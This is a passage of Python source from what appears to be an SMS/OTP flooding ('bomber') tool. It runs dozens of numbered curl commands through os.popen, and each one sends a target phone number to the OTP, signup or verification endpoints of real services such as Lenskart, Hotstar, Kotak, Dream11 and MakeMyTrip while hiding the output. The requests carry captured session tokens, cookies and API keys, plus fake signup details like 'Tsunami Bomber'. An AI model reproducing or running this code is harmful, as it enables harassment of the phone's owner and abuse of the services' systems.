                            curl -X POST -H "Host:api.lenskart.com" -H "content-length:26" -H "origin:https://www.lenskart.com" -H "x-b3-traceid:991600776345288" -H "user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/json;charset=UTF-8" -H "accept:application/json, text/plain, */*" -H "cache-control:no-cache, no-store" -H "x-session-token:3bcac6f3-bda5-4370-8dc1-eebd8274b399" -H "x-api-client:mobilesite" -H "referer:https://www.lenskart.com/customer/account/login" -H "accept-encoding:gzip, deflate" -H "accept-language:en-US" -d '{"telephone":"'''
                + target +
                '''"}' "https://api.lenskart.com/v2/customers/sendOtp"  > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#45",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:www.urbanclap.com" -H "content-length:100" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json;charset=UTF-8" -H "accept:application/json, text/plain, */*" -H "cache-control:no-cache" -H "x-device-os:web" -H "x-version-name:web_v4.137.2" -H "save-data:on" -H "x-client-key:f4113c23a68c9cb3bf695c4490f9f3da9abc8674712f5b870906ec26bab7602aed85ad71640e8d9f785ea09db5a298a950b335adc5b8cbb6ce58209e2912eac6" -H "x-device-id:ucuf1348-a14e179422-8c71-b87f-9eb1-edeca1376e-1600777338230" -H "x-version-code:4.137.2" -H "origin:https://www.urbancompany.com" -H "sec-fetch-site:cross-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d '{"country_id":"IND","phone":{"isd_code":"+91","phone_wo_isd":"'''
                + target +
                '''"},"device_type":"customer"}' "https://www.urbanclap.com/api/v2/growth/profile/generateOTP"  > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#46",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:login.web.ajio.com" -H "Connection:keep-alive" -H "Content-Length:159" -H "accept:application/json" -H "Origin:https://www.ajio.com" -H "User-Agent:Mozilla/5.0 (Linux; Android 5.1.1; SM-J320F Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36" -H "content-type:application/json" -H "Referer:https://www.ajio.com/signup" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-GB,en-US;q=0.8,en;q=0.6" -d '{"firstName":"Djdhdjsjsjsjsk","login":"xjdjdosh@gmail.com","password":"spider##1213","genderType":"Female","mobileNumber":"'''
                + target +
                '''","requestType":"SENDOTP"}' "https://login.web.ajio.com/api/auth/signupSendOTP" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#47",A)
        try:
            os.popen(
                '''curl -X POST -H "Host:api.lenskart.com" -H "content-length:26" -H "origin:https://www.lenskart.com" -H "x-b3-traceid:991603826710278" -H "user-agent:Mozilla/5.0 (Linux; Android 5.1.1; SM-J320F Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36" -H "content-type:application/json;charset=UTF-8" -H "accept:application/json, text/plain, */*" -H "cache-control:no-cache, no-store" -H "x-session-token:59dc2d84-55e6-4fc7-be6d-958b458ccd1e" -H "x-api-client:mobilesite" -H "referer:https://www.lenskart.com/customer/account/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-GB,en-US;q=0.8,en;q=0.6" -d '{"telephone":"'''
                + target +
                '''"}' "https://api.lenskart.com/v2/customers/sendOtp" > ''')
            times = times + 1
        except Exception as A:
            print("#48",A)
        try:
            os.popen(
                '''curl -X POST -H "Host:apiv2.sonyliv.com" -H "content-length:111" -H "device_id:5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120" -H "security_token:eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDM4Mjc0NTEsImV4cCI6MTYwNTEyMzQ1MSwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.Pxfpv3puWt_4sbltsDa2UsmgeeSp30KK2lePV15-_AQ1dQ4Q6Iq6W2fKEpXUaz4WnXEMxIHTu4u7RRYjkp4SgKzuRFD4rMYyWxPBqdz2Xdsqp3eCYjza_re4bbJigWoF0X-X9Tue5D1wBjxr_XWlk9apED8gmzewR3SQnHgnFSf-TRqvb8v9nLofBcCLTLKs11yHDmZv8WN9Hi4G_xXxoRN1IqjqW4kHbXvw8hHxzyQZPAgmP18FZkJk62vHTUOcIa1cAFXrRl9yInqUj3UDaPVIJ4tu7XQGuTjn21iqusgWkXKtKnoeHftWrxbd645JeeBQik1b8qESSYCI1xMzD01eEcmaxaSP5abuCEMBGHmGIVwpyskiSwkBT-cuZe216i07XxZuaeo29mXrkuizNXfhAgZ1GvLD22rYOHt-PaGA-bKy_wHZv6ILf6Wt9XwuuxzroRKd_IS2Nl3pNMRzTl1UJ02uCTWw8RIdLFykiH3lBXSv4OkHMVUVJJp6KSSQHuH8Ejw3Zjag_rL2XkZvU7T9dT1ddforRk92_nuE96NTaj_UM-gb920oYoGBIxD-CoR5EvqbWlN4WzFF-AaV4auYobW9y1c0i-LiZrPE7dkDyuWSBsk1R-fBpTQDV2OhmbvWYiquurrKFhY5HFZy6bZ-Xrw_58mkn7-Ek0LaAEQ" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:application/json" -H "accept:application/json, text/plain, */*" -H "session_id:1b3e01a7268d4aff933446f020e2f3ab-1603827494316" -H "x-via-device:true" -H "app_version:3.1.42.3" -H "origin:https://www.sonyliv.com" -H "sec-fetch-site:same-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d '{"mobileNumber":"'''
                + target +
                '''","channelPartnerID":"MSMIND","country":"IN","timestamp":"2020-10-27T19:39:13.355Z"}' "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP" > '''
            )
            times = times + 1
        except Exception as A:
            print("#49",A)
        try:
            os.popen(
                '''curl -X POST -H "Host:us-central1-vootdev.cloudfunctions.net" -H "content-length:59" -H "accept:application/json, text/plain, */*" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:application/json;charset=UTF-8" -H "origin:https://www.voot.com" -H "sec-fetch-site:cross-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.voot.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d '{"type":"mobile","mobile":"'''
                + target +
                '''","countryCode":"+91"}' "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser" > /dev/null 2>&1'''
            )
            times = times + 1
        except Exception as A:
            print("#50",A)
        try:
            os.popen(
                '''curl -X GET -H "Host:b2bapi.zee5.com" -H "Connection:keep-alive" -H "Accept:*/*" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "Origin:https://www.zee5.com" -H "Sec-Fetch-Site:same-site" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://www.zee5.com/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" "https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno='''
                + target + '''" > /dev/null 2>&1''')
            times = times + 1
        except Exception as A:
            print("#51",A)
        try:
            os.popen(
                '''curl -X POST -H "Host:api.cloud.altbalaji.com" -H "Connection:keep-alive" -H "Content-Length:86" -H "Accept:application/json, text/plain, */*" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "X-API-KEY:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMzkxNTgyNjcxMH0.xpvhIZb9W-sLsITPKBusMKguK_2WzIioXJSwAjtzCnU" -H "Content-Type:application/json" -H "Origin:https://www.altbalaji.com" -H "Sec-Fetch-Site:same-site" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://www.altbalaji.com/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -d '{"phone_number":"'''
                + target +
                '''","country_code":"91","platform":"web","exp":1603915826710}' "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN" > /dev/null 2>&1'''
            )
            times = times + 1
        except Exception as A:
            print("#52",A)
        try:
            os.popen(
                '''curl -X PUT -H "Host:api.hotstar.com" -H "content-length:51" -H "x-hs-usertoken:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDQ0MzQ5NDUsImlhdCI6MTYwMzgzMDE0NSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiNDcuOS4xMjIuNDVcIixcImNvdW50cnlDb2RlXCI6XCJpblwiLFwiY3VzdG9tZXJUeXBlXCI6XCJudVwiLFwidHlwZVwiOlwiZ3Vlc3RcIixcImlzRW1haWxWZXJpZmllZFwiOmZhbHNlLFwiaXNQaG9uZVZlcmlmaWVkXCI6ZmFsc2UsXCJkZXZpY2VJZFwiOlwiZmFhODhmMDUtNzQzMi00MTAzLTk4ODYtN2JkOTM0ZjVjM2ExXCIsXCJwcm9maWxlXCI6XCJBRFVMVFwiLFwidmVyc2lvblwiOlwidjJcIixcInN1YnNjcmlwdGlvbnNcIjp7XCJpblwiOnt9fSxcImlzc3VlZEF0XCI6MTYwMzgzMDE0NTg4NH0iLCJ2ZXJzaW9uIjoiMV8wIn0.ATU4GrG4KucvkynhrFdg28qJ9LRwsN5MoWHlirRQsqo" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:application/json" -H "x-hs-platform:PCTV" -H "x-country-code:IN" -H "x-hs-device-id:faa88f05-7432-4103-9886-7bd934f5c3a1" -H "hotstarauth:st=1603830144~exp=1603836144~acl=/um/v3/*~hmac=cc2a715c0f26045e44e271d198ae382468d8a7dcb08825623016d6dcea06072d" -H "x-hs-appversion:6.93.0" -H "x-request-id:faa88f05-7432-4103-9886-7bd934f5c3a1" -H "accept:*/*" -H "origin:https://www.hotstar.com" -H "sec-fetch-site:same-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.hotstar.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d '{"phone_number":"'''
                + target +
                '''","country_prefix":"91"}' "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp" > /dev/null 2>&1'''
            )
            times = times + 1
        except Exception as A:
            print("#53",A)
        try:
            os.popen(
                '''curl -X POST -H "Host:www.dream11.com" -H "content-length:316" -H "accept:*/*" -H "device:pwa" -H "x-csrf:fb1f1947-4547-392d-9a28-a9de30d9e766" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:application/json" -H "origin:https://www.dream11.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.dream11.com/register?testcode=affpwa2&utm_source=VcomIndWeb&utm_medium=cpr&utm_campaign=98885&utm_content=20200919" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:WZRK_S_W4R-49K-494Z=%7B%22p%22%3A1%2C%22s%22%3A1602759175%2C%22t%22%3A1602759175%7D" -H "cookie:dh_user_id=91c4edf0-0ed4-11eb-9f02-755b4004c50d" -H "cookie:WZRK_G=dc2112f4850746a0b8b47c233471fe4a" -H "cookie:ajs_anonymous_id=%2218835b7c-2e60-48c2-a6c4-79dc7e7c169a%22" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:__csrf=fb1f1947-4547-392d-9a28-a9de30d9e766" -d '{"query":"mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}","variables":{"email":"tsunami@gmail.com","mobileNumber":"'''
                + target +
                '''","password":"tsunami@123astronomia"}}' "https://www.dream11.com/graphql/mutation/pwa/register" > /dev/null 2>&1'''
            )
            times = times + 1
        except Exception as A:
            print("#54",A)
        try:
            os.popen(
                '''curl -X POST -H "Host:www.quikr.com" -H "content-length:624" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded;charset=UTF-8" -H "accept:*/*" -H "origin:https://www.quikr.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.quikr.com/SignIn?redirect=https%3A%2F%2Fwww.quikr.com%2F" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:__utmb=119021961.4.9.1603857402954" -H "cookie:_jk_id=ff9d1bcb-918d-49f4-bb9b-bb5a8f6628f7.1603857388.1.1603857388." -H "cookie:_fbp=fb.1.1603857388273.785408433" -H "cookie:_gcl_au=1.1.1726929010.1603857388" -H "cookie:__utmt=1" -H "cookie:__utmz=119021961.1603857384.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)" -H "cookie:__utmc=119021961" -H "cookie:__utma=119021961.1718379111.1603857381.1603857384.1603857384.1" -H "cookie:__redirectUrl=https%3A%2F%2Fwww.quikr.com%2F" -H "cookie:_gat_quikrRUMTracker=1" -H "cookie:_gat_quikrCrossCategoryRecommendationTracker=1" -H "cookie:_gat_quikrPWATracker=1" -H "cookie:utmztrack=utmcsr%3D%28direct%29%7Cutmccn%3D%28direct%29%7Cutmcmd%3D%28none%29" -H "cookie:abRandMobile=23" -H "cookie:_gid=GA1.2.355756152.1603857381" -H "cookie:_ga=GA1.2.1718379111.1603857381" -H "cookie:__at=eb75a6ee-1fbe-4f22-9b01-fc6fd80be4b0" -H "cookie:brsampl=79253.79107" -H "cookie:abRand=17" -H "cookie:new_prefer_city=www" -H "cookie:prefer_city_id=1" -d 'user='''
                + target +
                '''&CSRFKey=login_csrf_token&CSRFValue=2d798470b2fb7b96d59d41ce289f6b88&token=03AGdBq250swygN0BZpSQUIeR3kzgOs7dzUMwPxeC99DpmRiCqpfyUMLfFITJT6V6KAV8T94vfhY7IYg0Dg4DK5Vy8SEhGXg5XrKqRI1K6YqQwTOCWu9w6cwVSXhTXFXPraD6tYAumNW92Czo3wer9VOEmbYDZpvVVT3kgLzbFCPGu_BZjakj6dF1LkyajBiiWDqSiV15D73atPRfUdo_7CAjBrtzEyyKorYztttEWIhqMI-wKXL_EGtyDAhDRVnQKIjKvMzW4vVYSUWiQ5ffKM7KUlNvy8QJAIYD-3sJ-TT9mD5WP1KgPuw8dbyDvLFv36q7-IDMJYWU0nZXa6Ot8rVPqqqAkCZcoCcLcCHPFGj_pheOOkoEEo7E022NTJBPHxXUVA7fJP8zqXFWjajX0ljFT6iZj5qB5yEOviiTj1kTtt1xmfea7Zs7WtwV9QKd5ytbheE-VUAxoFcRff-6zXSSerEXVdwv892fnnhSVbYWH3pABRoyr2Wh1RVBpYREY8fYihyu9V358&v3=true' "https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3" > /dev/null 2>&1'''
            )
            times = times + 1
        except Exception as A:
            print("#55",A)
        try:
            os.popen(
                '''curl -X POST -H "Host:www.kotak.com" -H "Connection:keep-alive" -H "Content-Length:143" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "X-Requested-With:XMLHttpRequest" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Origin:https://www.kotak.com" -H "Sec-Fetch-Site:same-origin" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/vkyc-home.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -H "Cookie:JSESSIONID=0000P-ep34ciOrPvp1ymnR48y_E:-1; NSC_JO0ork0tdyr4qd4blzcfyrcuwai1eb0=ffffffff09023da045525d5f4f58455e445a4a42150c; _gcl_au=1.1.1243881610.1603857484; WZRK_G=7ce1a924d4324651b5060fb3eb9c1e87; WZRK_S_W4W-5K7-K75Z=%7B%22p%22%3A1%2C%22s%22%3A1603857484%2C%22t%22%3A1603857484%7D; _ga=GA1.2.494540412.1603857484; _gid=GA1.2.844884659.1603857484; _uetsid=c7f02f4018d111ebb67e1da217874a38; _uetvid=c7f28de018d111eb8cbb5dd28b9f9334; _fbp=fb.1.1603857484947.174573870; _dc_gtm_UA-4203568-53=1; _gat_UA-4203568-53=1; _gat_UA-4203568-59=1; _hjTLDTest=1; _hjid=a83b36d7-433b-41f6-8ede-161af7e27204; _hjAbsoluteSessionInProgress=0; _gaexp=GAX1.2.kNrNERU2Qx2igfIj9Nwmtw.18644.1; _gat_gtag_UA_4203568_53=1" -d 'cust_full_name=Tsunami+Bomber&cust_email=tsunami%40gmail.com&cust_mobile='''
                + target +
                '''&cust_political_disclaimer=Yes&cust_fatca_disclaimer=Yes' "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_&SWNToken=1603857481489&flw=vkyc" > /dev/null 2>&1'''
            )
            times = times + 1
        except Exception as A:
            print("#56",A)
        try:
            os.popen(
                '''curl -X POST -H "Host:www.kotak.com" -H "Connection:keep-alive" -H "Content-Length:0" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "X-Requested-With:XMLHttpRequest" -H "Origin:https://www.kotak.com" -H "Sec-Fetch-Site:same-origin" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/otp-mobile.action?SWNToken=1603857646468&flw=vkyc" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -H "Cookie:JSESSIONID=0000P-ep34ciOrPvp1ymnR48y_E:-1; NSC_JO0ork0tdyr4qd4blzcfyrcuwai1eb0=ffffffff09023da045525d5f4f58455e445a4a42150c; _gcl_au=1.1.1243881610.1603857484; WZRK_G=7ce1a924d4324651b5060fb3eb9c1e87; _ga=GA1.2.494540412.1603857484; _gid=GA1.2.844884659.1603857484; _fbp=fb.1.1603857484947.174573870; _hjTLDTest=1; _hjid=a83b36d7-433b-41f6-8ede-161af7e27204; _hjAbsoluteSessionInProgress=0; _dc_gtm_UA-4203568-53=1; _gat_UA-4203568-53=1; _gat_UA-4203568-59=1; _gaexp=GAX1.2.kNrNERU2Qx2igfIj9Nwmtw.18644.1!ewD-u9AjS-WPbaOPvAM_cw.18641.1; _gat_gtag_UA_4203568_53=1; WZRK_S_W4W-5K7-K75Z=%7B%22p%22%3A4%2C%22s%22%3A1603857484%2C%22t%22%3A1603857661%7D; _uetsid=c7f02f4018d111ebb67e1da217874a38; _uetvid=c7f28de018d111eb8cbb5dd28b9f9334" -d '' "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/resend-otp0on-call.action?SWNToken=1603857646468&flw=vkyc" > /dev/null 2>&1'''
            )
            times = times + 1
        except Exception as A:
            print("#57",A)
        try:
            os.popen(
                '''curl -X POST -H "Host:www.cuemath.com" -H "content-length:269" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:application/JSON" -H "accept:*/*" -H "origin:https://www.cuemath.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.cuemath.com/parent/signup/?" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:cookieconsent_status=dismiss" -H "cookie:_CEFT=Q%3D%3D%3D" -H "cookie:_fbp=fb.1.1603882875848.1161506818" -H "cookie:_uetvid=e5a9c120190c11eba48bfd200f8a14a3" -H "cookie:_uetsid=e5a5ac70190c11ebbbd2895d4b869731" -H "cookie:AF_BANNERS_SESSION_ID=1603882874676" -H "cookie:_dc_gtm_UA-75184559-1=1" -H "cookie:cue_gacid=543040074.1603882874" -H "cookie:_gid=GA1.2.310046842.1603882874" -H "cookie:_ga=GA1.2.543040074.1603882874" -H "cookie:_gcl_au=1.1.109511992.1603882873" -H "cookie:landing_page=%2F" -H "cookie:referrer=https%3A%2F%2Fwww.google.com%2F" -H "cookie:cue_country_code=j%3Anull" -H "cookie:__cfduid=dbfb990bb3a6f23fba926d9894a45d9351603882867" -d '{"intl_mobile":{"phone":"'''
                + target + '''"},"notify":["notify_on_whatsapp"],"phone":"''' +
                target +
                '''","email":"tsunami@gmail.com","full_name":"Tsunami Bomber","timezone":"Asia/Calcutta","notify_through":"notify_on_whatsapp","form_fields":"full_name,email,intl_mobile"}' "https://www.cuemath.com/api/v4/parents/" > /dev/null 2>&1'''
            )
            times = times + 1
        except Exception as A:
            print("#58",A)
        try:
            os.popen(
                '''curl -X GET -H "Host:m.redbus.in" -H "accept:application/json, text/plain, */*" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://m.redbus.in/preregister" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:InsuranceSelectionMandatoryAB=true" -H "cookie:_gaexp=GAX1.2.ydiJq7nqRp2qwH9bGeJ7iA.18643.1" -H "cookie:AMP_TOKEN=%24RETRIEVING" -H "cookie:_dc_gtm_UA-9782412-15=1" -H "cookie:bm_sv=9E28BBBC7C50B7C4696B372D8BAC57DD~FujGt6Eg0nVxRjbs7w16SYQxRrn4ibS6C4O35nNI46Wa54pu8oLqBL+8LXCBXSu+qNLsaA2z3EhBQ2NJOGFgZQOFJni0ltCOTwkdIBEWFLvWXJqyjP9aBobJWXAb033QYLekls1QUUPTHpXX/N6Z3qfl2T+jfIWZn2/L+BMMEWk=" -H "cookie:tvc_user_type=new" -H "cookie:_gat_UA-9782412-15=1" -H "cookie:_gid=GA1.3.500450699.1603883075" -H "cookie:_ga=GA1.3.1053631502.1603883075" -H "cookie:tvc_session_alive_bus=1" -H "cookie:tvc_smc_bus=google / organic / (not set)" -H "cookie:onetap=1" -H "cookie:browserDetailLogged=true" -H "cookie:ak_bmsc=62C933CFC108F5A7DB2E4DB99B81A517312C8DB7255F00003F50995F653B6B3A~pl0AUU7E0Y4mYuTnusgXPCAIx3wuJ0BKA4VoJxFOPMnHcyqkHjYGhu/zJlnq2f7ZekdNEepf+qicaUQJTv9mpALDXDYb+qwnDAp0isRSh0hNxaJX80eZsoXaS9ll2J8wOxBEKPCWqckjgfKPKuj0F5RvI99oEaWFShskRvKwAib8OottTL3nAl3w1R+xZ17DeOhUJkdXgIoRrXeU1351r9DlzO6LVO9dpdPSm6W0VB+yk=" -H "cookie:rbuuid=5abc9630-190d-11eb-9b77-b99a83976b59" -H "cookie:selectedCurrency=INR" -H "cookie:language=en" -H "cookie:defaultlanguage=en" -H "cookie:currency=INR" -H "cookie:country=IND" -H "cookie:country_ISO=IN" "https://m.redbus.in/api/getOtp?number='''
                + target + '''&cc=91&whatsAppOpted=undefined" > /dev/null 2>&1''')
            times = times + 1
        except Exception as A:
            print("#59",A)
        try:
            os.popen(
                '''curl -X GET -H "Host:m.happyeasygo.com" -H "accept:application/json, text/plain, */*" -H "x-device:mobile" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://m.happyeasygo.com/register" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:_gat_UA-93580804-7=1" -H "cookie:_uetvid=50664fb0190e11ebb0434db0b4466b92" -H "cookie:_uetsid=50641740190e11eb93bb73bbfb574f40" -H "cookie:refurl=" -H "cookie:_gac_UA-93580804-2=1.1603883483.Cj0KCQjwreT8BRDTARIsAJLI0KKh4tcoeyPvkF1sGzrrthbqsRK0aP8Ja1mQhWtGywII0KMC86A4pnkaAvgnEALw_wcB" -H "cookie:_gid=GA1.2.1298233779.1603883483" -H "cookie:_ga=GA1.2.2010415513.1603883483" -H "cookie:deviceId=96146d25-169e-4be3-a11e-de78b43c37fd" -H "cookie:_fbp=fb.1.1603883483792.1510659266" -H "cookie:_gac_UA-93580804-2=1.1603883483.Cj0KCQjwreT8BRDTARIsAJLI0KKh4tcoeyPvkF1sGzrrthbqsRK0aP8Ja1mQhWtGywII0KMC86A4pnkaAvgnEALw_wcB" -H "cookie:_gid=GA1.3.1298233779.1603883483" -H "cookie:_ga=GA1.3.2010415513.1603883483" -H "cookie:_gcl_au=1.1.417055803.1603883482" -H "cookie:_gcl_aw=GCL.1603883482.Cj0KCQjwreT8BRDTARIsAJLI0KKh4tcoeyPvkF1sGzrrthbqsRK0aP8Ja1mQhWtGywII0KMC86A4pnkaAvgnEALw_wcB" "https://m.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20'''
                + target + '''&verifycode=FDCA" > /dev/null 2>&1''')
            times = times + 1
        except Exception as A:
            print("#60",A)
        try:
            os.popen(
                '''curl -X POST -H "Host:mapi.makemytrip.com" -H "content-length:71" -H "deviceid:a3d2f892-af4d-40d1-808a-db6286b8fe1f" -H "currency:inr" -H "language:eng" -H "authorization:h4nhc9jcgpAGIjp" -H "visitor-id:a3d2f892-af4d-40d1-808a-db6286b8fe1f" -H "region:in" -H "accept:application/json" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "content-type:application/json" -H "user-identifier:{"ipAddress":"ipAddress","imie":"imie","appVersion":"2.0.0","deviceId":"a3d2f892-af4d-40d1-808a-db6286b8fe1f","os":"PWA","osVersion":"osVersion","timeZone":"timeZone","type":"mmt-auth","value":null}" -H "vid:a3d2f892-af4d-40d1-808a-db6286b8fe1f" -H "tid:a3d2f892-af4d-40d1-808a-db6286b8fe1f" -H "origin:https://www.makemytrip.com" -H "sec-fetch-site:same-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.makemytrip.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:s_sess=%20s_cmp_pages%3DSEM%257CM%257CDF%257CG%257CBrand%257CB_M_Makemytrip_Search_Exact%257CBrand_Top_5_Exact%257CExpanded%257C456320328656%3B%20cf%3D0%3B%20s_cc%3Dtrue%3B%20tp%3D676%3B%20s_ppv%3Dmbls_login_main_page%252C100%252C100%252C676%3B%20s_sq%3D%3B" -H 